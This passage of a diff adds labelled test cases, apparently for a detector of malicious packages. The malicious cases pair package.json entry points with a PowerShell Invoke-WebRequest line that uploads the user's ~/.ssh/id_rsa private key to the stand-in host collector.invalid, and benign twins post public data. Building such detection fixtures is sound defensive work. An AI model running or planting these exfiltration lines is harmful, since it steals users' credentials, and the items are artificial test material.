+      "rationale": "PowerShell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-powershell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-powershell-key\", \"version\": \"1.0.0\", \"main\": \"index.ps1\"}",
+          "index.ps1": "Invoke-WebRequest -Uri https://collector.invalid -Method POST -Body (Get-Content \"$env:USERPROFILE/.ssh/id_rsa\")"
+        }
+      }
+    },
+    {
+      "id": "powershell-key/malicious/test-named-entry",
+      "family": "powershell-key",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "PowerShell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-powershell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-powershell-key\", \"version\": \"1.0.0\", \"main\": \"test/fixture.ps1\"}",
+          "test/fixture.ps1": "Invoke-WebRequest -Uri https://collector.invalid -Method POST -Body (Get-Content \"$env:USERPROFILE/.ssh/id_rsa\")"
+        }
+      }
+    },
+    {
+      "id": "powershell-key/malicious/custom-extension-entry",
+      "family": "powershell-key",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "PowerShell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-powershell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-powershell-key\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "Invoke-WebRequest -Uri https://collector.invalid -Method POST -Body (Get-Content \"$env:USERPROFILE/.ssh/id_rsa\")"
+        }
+      }
+    },
+    {
+      "id": "powershell-key/benign/entry",
+      "family": "powershell-key",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "PowerShell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-powershell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-powershell-key\", \"version\": \"1.0.0\", \"main\": \"index.ps1\"}",
+          "index.ps1": "Invoke-WebRequest -Uri https://service.invalid -Method POST -Body (Get-Content \"public-data.json\")"
+        }
+      }
+    },
+    {
+      "id": "powershell-key/benign/test-named-entry",
+      "family": "powershell-key",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "PowerShell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-powershell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-powershell-key\", \"version\": \"1.0.0\", \"main\": \"test/fixture.ps1\"}",
+          "test/fixture.ps1": "Invoke-WebRequest -Uri https://service.invalid -Method POST -Body (Get-Content \"public-data.json\")"
+        }
+      }
+    },
+    {
+      "id": "powershell-key/benign/custom-extension-entry",
+      "family": "powershell-key",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "PowerShell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-powershell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-powershell-key\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "Invoke-WebRequest -Uri https://service.invalid -Method POST -Body (Get-Content \"public-data.json\")"
+        }
+      }
+    }
+  ]
+}
